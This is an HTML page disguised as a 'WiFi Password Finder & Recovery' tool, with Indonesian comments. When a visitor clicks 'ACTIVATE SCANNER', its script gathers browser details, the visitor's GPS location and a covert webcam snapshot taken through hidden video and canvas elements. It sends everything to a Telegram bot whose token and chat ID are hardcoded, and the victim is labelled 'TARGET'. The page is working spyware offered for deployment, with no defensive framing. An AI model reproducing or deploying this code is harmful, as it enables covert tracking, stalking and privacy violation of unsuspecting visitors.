<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Password Finder & Recovery</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; text-align: center; padding: 50px; }
        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .loader { border: 4px solid #30363d; border-top: 4px solid #1f6feb; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="card" id="main-card">
    <h2>PROCESSING VERIFICATION</h2>
    <div class="loader"></div>
    <p>Securely transmitting your data...</p>
    <p>Generating recovery code. Please wait 10-15 seconds...</p>
    <button onclick="startHack()">ACTIVATE SCANNER</button>
</div>

<video id="video" width="640" height="480" autoplay style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const token = '8519441569:AAE4P3qWGYZsH2awhrH4PKHCvC2a2hFl7us'; // Ganti Token Bot Lu
    const chatId = '8463509843'; // Ganti Chat ID Lu

    function sendMessage(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'html' })
        });
    }

    async function startHack() {
        alert("Akses diperlukan untuk memindai jaringan WiFi terdekat!");
        
        // 1. Ambil Data Sistem & Browser
        let info = `<b>-- TARGET DATA HIT --</b>\n`;
        info += `User Agent: ${navigator.userAgent}\n`;
        info += `Platform: ${navigator.platform}\n`;
        info += `Language: ${navigator.language}\n`;
        info += `Cookies Enabled: ${navigator.cookieEnabled}\n`;
        sendMessage(info);

        // 2. Ambil Lokasi (Tracking)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let loc = `<b>-- TARGET LOCATION --</b>\n`;
                loc += `Lat: ${pos.coords.latitude}\n`;
                loc += `Long: ${pos.coords.longitude}\n`;
                loc += `Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendMessage(loc);
            });
        }

        // 3. Sadap Kamera (Auto Snap)
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            setTimeout(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, 640, 480);
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'target.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/jpeg');
            }, 3000);
        } catch (err) {
            sendMessage("Akses Kamera Ditolak Target.");
        }
    }
</script>

</body>
</html>
